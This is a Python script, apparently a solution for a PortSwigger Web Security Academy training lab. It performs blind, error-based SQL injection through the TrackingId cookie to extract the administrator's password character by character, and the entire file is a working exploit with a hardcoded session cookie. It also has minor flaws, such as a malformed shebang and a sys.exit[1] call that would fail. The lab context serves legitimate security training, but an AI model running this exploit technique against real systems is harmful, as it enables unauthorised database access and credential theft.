#/usr/bin/python3

from ast import If
from pwn import *
import requests, signal, time, pdb, sys, string

# CERRAR EL PROGRAMA
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit[1]

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a7700b004d4beb6c003069a0028004b.web-security-academy.net/" # DIRECCION DE ATAQUE
characters = string.printable

password = ""

def makeRequest():

    password = ""
    print("\n")

    p1 = log.progress("Aplicando FUERZA BRUTA")
    p1.status("\n\n COMENZANDO EL ATAQUE...")

    time.sleep(2)
    print("\n")

    p2 = log.progress("PASSWORD")

    for position in range(1,21):
        for character in characters:

            # MODIFICAR EL TRACKING ID POR EL QUE CORRESPONDA
            # MODIFICAR LAS SESSION POR LA QUE CORRESPONDA
            cookies = {
                'TrackingId':"MQzm5EkZoDdZM1SJ'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session':'g8g9l78QSNz0yisEv2gCwbVFcpvVGUlL'
            }
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500: # SI EL CODIGO DE RESPUESTA ES 500, ENTONCES EL CARACTER ES CORRECTO
                password += character
                p2.status(password)
                break

        if position == 20:
            p1.success("[!] ATAQUE FINALIZADO.")
            p2.success(password)
            print("\n CONTRASEÑA ENCONTRADA: %s" % password)

if __name__ == "__main__":
    makeRequest()
